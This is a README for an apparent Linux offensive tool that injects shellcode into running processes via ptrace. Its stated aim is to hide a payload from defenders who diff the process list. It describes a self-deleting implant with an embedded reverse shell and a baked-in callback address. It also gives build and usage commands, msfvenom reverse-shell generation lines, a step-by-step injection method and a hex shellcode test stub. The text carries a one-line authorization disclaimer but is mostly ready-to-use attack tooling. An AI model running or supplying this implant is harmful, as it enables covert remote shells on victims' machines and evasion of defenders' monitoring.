# linux-memexec — Linux in-memory shellcode executor

Runs raw shellcode entirely in memory. No file is written and no new process
is created by the executor itself: the payload becomes a thread of whichever
process hosts it.

The whole point, in A/D terms: a defender who snapshots the process list and
diffs it later cannot see a payload that runs *inside* an already-running
process. `inject` mode is the piece that delivers that — the loader attaches,
writes the shellcode, resumes, and exits. Nothing new remains in `ps`.

Use only on systems and CTF targets where you have authorization.

## Single-binary implant (recommended)

One self-contained ELF: run it on the pwned box, it unlinks itself, injects
an embedded revshell into an existing process (no new PID appears), and
falls back to running in place if ptrace is unavailable. This is the
"minimal revshell but hidden" form.

```sh
python3 make_shell.py <IP> <PORT> <NAME> -o shell   # ~15 KB, callback baked in
# on the target:
./shell                              # auto-picks a host, or runs in place
./shell --pid 1234                   # force a specific host PID
./shell --name <service>             # force a host by process name
```

`NAME` becomes the shell's `argv[0]`. The minimal-revshell features are kept:
auto self-delete (nothing left on disk), custom `argv[0]`, baked IP/port, and
a quiet fallback so you always get the callback. Verified end-to-end: a bare
run falls back to an in-place shell; `--pid`/`--name` inject into the target
PID with no new process in `ps`.

## Build

```sh
./build.sh          # needs gcc; produces ./memexec (x86-64)
```

## Usage

```sh
./memexec <shellcode.bin>               # run as a thread of this process
./memexec <shellcode.bin> --pid 1234    # inject into PID 1234, then exit
./memexec <shellcode.bin> --name sleep  # inject into first process named sleep
./memexec --hex <hex...>                # shellcode inline, no file
```

Shellcode can come from a file or `--hex` (whitespace in the hex is ignored).
The blob must match the host process architecture (x86-64 for the default
build).

## One command, end to end

Generate the reverse-shell shellcode, then inject it into an existing process:

```sh
python3 shellcode.py <IP> <PORT> <NAME> -o sc.bin
./memexec sc.bin --name <service-process>   # inject -> no new PID
```

`shellcode.py` builds the same socket → connect → dup2 → `execve("/bin//sh")`
reverse shell as raw position-independent x86-64 bytes (`NAME` becomes the
shell's `argv[0]`). On the target, `memexec` runs those bytes as a thread of
an already-running process. Verified end-to-end: the injected PID stays put
(it just gets renamed by the `execve`), and no new process appears in `ps`.

## Generating shellcode

Prefer `shellcode.py` (above) since it pairs with `memexec` and keeps the
custom `argv[0]`. `msfvenom` also works:

```sh
# 64-bit interactive shell (execve: replaces the host process in place)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o sc.bin

# 32-bit host: build memexec with -m32 and use
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o sc.bin
```

## Footprint

| mode    | process list |
| ------- | ------------ |
| `self`  | one process (this exe) hosts the payload as a thread. "Nothing new" only if invoked from an already-running context — otherwise the loader itself is a new process. |
| `inject`| loader exits immediately after resuming the target; the payload lives as a thread of a process that already existed. No new PID appears. |

Two payload behaviors to be aware of (they decide what a per-PID diff sees):

- **`execve`-based payloads** (most msfvenom shells) replace the host process
  in place: same PID, no new process, but the service dies and that PID's
  name/`comm` changes to the shell. Best for *count*-based diffs.
- **`fork`-based payloads** keep the service running normally but add a
  child PID — which looks like a service-spawned process if the service
  spawns children anyway.

Neither is invisible to a diff that compares per-PID attributes; only a
rootkit (or never running a new/borrowed process) fully hides. `inject` just
removes the *new-PID* signal.

## How the injection works

1. `ptrace(PTRACE_ATTACH)` + `waitpid` to stop the target.
2. Read `/proc/<pid>/maps`.
   - If the target has an **rwxp** page (older/unhardened binaries, JITs),
     the payload is written there directly — clean, nothing else touched.
   - Otherwise a small x86-64 **bootstrap** is patched into an **r-xp**
     page with `PTRACE_POKETEXT`: it calls `mmap` for a fresh RWX page,
     copies the payload there, and jumps to it. A few bytes of the host's
     code are briefly overwritten (restore not needed for `execve` payloads).
3. `PTRACE_SETREGS` points `rip` at `at+2` (the code is prefixed with a
   `EB 00` shim), then the tracee is resumed and `SIGCONT` is delivered.
   That signal interrupts whatever blocking syscall the target is stuck in
   (nanosleep/accept/poll). Two outcomes are handled by the shim:
   - the syscall returns `-EINTR` → the thread lands on the payload at `at+2`;
   - the kernel **restarts** the syscall, which rewinds `rip` by the 2-byte
     `syscall` instruction to `at` → the `EB 00` jumps into the payload.
4. The tracee is stopped again (`PTRACE_INTERRUPT`) and detached; the payload
   keeps running as a thread of the target.

## Smoke test (no msfvenom needed)

This x86-64 stub creates `/tmp/pwned` containing `x`, then spins in `jmp $`
so it verifies the whole path without crashing the host:

```sh
HEX='48 8d 3d 35 00 00 00 be 41 00 00 00 ba a4 01 00 00 b8 02 00 00 00
     0f 05 48 85 c0 78 1d 48 89 c7 48 8d 35 20 00 00 00 ba 01 00 00 00
     b8 01 00 00 00 0f 05 b8 03 00 00 00 0f 05 eb fe
     2f 74 6d 70 2f 70 77 6e 65 64 00 78'

# self mode (no ptrace needed):
./memexec --hex "$HEX" & sleep 1; cat /tmp/pwned   # expect: x

# inject mode: needs ptrace access (same UID). Under the default
# yama ptrace_scope=1 the target must be a descendant or opt in:
cat > /tmp/optin.c <<'EOF'
#define _GNU_SOURCE
#include <sys/prctl.h>
#include <unistd.h>
#include <stdio.h>
int main(void) { prctl(PR_SET_PTRACER, (unsigned long)-1, 0, 0, 0);
                 printf("%d\n", (int)getpid()); fflush(stdout);
                 for (;;) sleep(1000); }
EOF
gcc -O2 -o /tmp/optin /tmp/optin.c
/tmp/optin & TID=$!; sleep 0.3
rm -f /tmp/pwned
./memexec --hex "$HEX" --pid $TID
sleep 0.3; cat /tmp/pwned                 # expect: x
kill -9 $TID
```

## Limitations

- **ptrace access**: same UID required; on Ubuntu (default
  `kernel.yama.ptrace_scope=1`) a process can only ptrace its own
  descendants, so injecting into an arbitrary sibling is blocked unless it
  opts in via `prctl(PR_SET_PTRACER)` (or `ptrace_scope=0`). Check with
  `cat /proc/sys/kernel/yama/ptrace_scope`.
- **Architecture**: blob and host must match (x86-64 default; `-m32` build
  + 32-bit shellcode for i386 hosts).
- **Executable region**: a hardened target with no `rwxp`/`r-xp` region (and
  no executable stack) can't be injected this way.
- **Multi-thread**: injection hijacks the attached thread; other threads keep
  running. An `execve` payload kills them all.
